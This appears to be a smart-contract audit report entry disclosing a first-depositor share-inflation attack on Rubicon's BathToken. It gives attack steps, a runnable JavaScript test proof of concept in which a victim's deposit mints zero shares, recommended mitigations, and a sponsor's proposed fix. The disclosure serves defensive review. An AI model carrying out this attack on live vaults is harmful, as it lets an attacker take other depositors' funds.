[H-04] First depositor can break minting of shares
Submitted by MiloTruck, also found by cccz, oyc109, VAD37, PP1004, SmartSek, minhquanym, unforgiven, berndartmueller, WatchPug, CertoraInc, and sorrynotsorry_
The attack vector and impact is the same asTOB-YEARN-003, where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”.
Proof of Concept
InBathToken.sol:569-571, the allocation of shares is calculated as follows:
(totalSupply==0) ?shares=assets:shares= (assets.mul(totalSupply)).div(_pool);
An early attacker can exploit this by:
Attacker callsopenBathTokenSpawnAndSignal()withinitialLiquidityNew = 1, creating a new bath token withtotalSupply = 1Attacker transfers a large amount of underlying tokens to the bath token contract, such as1000000Usingdeposit(), a victim deposits an amount less than1000000, such as1000:assets = 1000(assets * totalSupply) / _pool = (1000 * 1) / 1000000 = 0.001, which would round down to0Thus, the victim receives no shares in return for his deposit
To avoid minting 0 shares, subsequent depositors have to deposit equal to or more than the amount transferred by the attacker. Otherwise, their deposits accrue to the attacker who holds the only share.
it("Victim receives 0 shares",async()=>{// 1. Attacker deposits 1 testCoin first when creating the liquidity poolconstinitialLiquidityNew=1;constinitialLiquidityExistingBathToken=ethers.utils.parseUnits("100",decimals);// Approve DAI and testCoin for bathHouseInstanceawaittestCoin.approve(bathHouseInstance.address,initialLiquidityNew, {from:attacker,});awaitDAIInstance.approve(bathHouseInstance.address,initialLiquidityExistingBathToken,{from:attacker});// Call open creation function, attacker deposits only 1 testCoinconstdesiredPairedAsset=awaitDAIInstance.address;awaitbathHouseInstance.openBathTokenSpawnAndSignal(awaittestCoin.address,initialLiquidityNew,desiredPairedAsset,initialLiquidityExistingBathToken,{from:attacker});// Retrieve resulting bathToken addressconstnewbathTokenAddress=awaitbathHouseInstance.getBathTokenfromAsset(testCoin.address);const_newBathToken=awaitBathToken.at(newbathTokenAddress);// 2. Attacker deposits large amount of testCoin into liquidity poolletattackerAmt=ethers.utils.parseUnits("1000000",decimals);awaittestCoin.approve(newbathTokenAddress,attackerAmt, {from:attacker});awaittestCoin.transfer(newbathTokenAddress,attackerAmt, {from:attacker});// 3. Victim deposits a smaller amount of testCoin, receives 0 shares// In this case, we use (1 million - 1) testCoinletvictimAmt=ethers.utils.parseUnits("999999",decimals);awaittestCoin.approve(newbathTokenAddress,victimAmt, {from:victim});await_newBathToken.deposit(victimAmt,victim, {from:victim});assert.equal(await_newBathToken.balanceOf(victim),0);});
Recommended Mitigation Steps
Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address. The same can be done in this case i.e. whentotalSupply() == 0, send the first min liquidity LP tokens to the zero address to enable share dilution.In_deposit(), ensure the number of shares to be minted is non-zero:
require(shares != 0, "No shares minted");
bghughes (Rubicon) confirmed and commented:
Great issue, what do y’all think of this code snippet as a solution:`
/// @notice Deposit assets for the user and mint Bath Token shares to receiver
function _deposit(uint256 assets, address receiver)
internal
returns (uint256 shares)
{
uint256 _pool = underlyingBalance();
uint256 _before = underlyingToken.balanceOf(address(this));// **Assume caller is depositor**underlyingToken.safeTransferFrom(msg.sender, address(this), assets);uint256 _after = underlyingToken.balanceOf(address(this));assets = _after.sub(_before); // Additional check for deflationary tokensif (totalSupply == 0) {uint minLiquidityShare = 10**3;shares = assets.sub(minLiquidityShare);// Handle protecting from an initial supply spoof attack_mint(address(0), (minLiquidityShare));} else {shares = (assets.mul(totalSupply)).div(_pool);}// Send shares to designated target_mint(receiver, shares);require(shares != 0, "No shares minted");emit LogDeposit(assets,underlyingToken,shares,msg.sender,underlyingBalance(),outstandingAmount,totalSupply);emit Deposit(msg.sender, msg.sender, assets, shares);}`
HickupHH3 (judge) commented:
LGTM :P